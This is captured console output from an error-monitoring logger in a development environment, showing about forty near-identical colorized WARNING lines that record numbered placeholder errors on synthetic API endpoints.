WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908162Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4098'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908214Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4099'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908266Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4100'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908316Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4101'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908365Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4102'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908414Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4103'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908463Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4104'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908511Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4105'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908561Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4106'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908610Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4107'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908658Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4108'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908706Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4109'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908754Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4110'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908802Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4111'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908852Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4112'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908901Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4113'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908949Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4114'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.908997Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4115'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909045Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4116'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909092Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4117'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909141Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4118'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909216Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4119'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909303Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4120'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909364Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4121'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909417Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4122'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909473Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4123'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909522Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4124'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909574Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4125'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909623Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4126'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909671Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4127'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909719Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4128'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909769Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4129'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909816Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4130'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909867Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4131'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909927Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4132'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.909980Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4133'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910033Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4134'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910084Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4135'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910135Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4136'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.910187Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m83[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4137'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
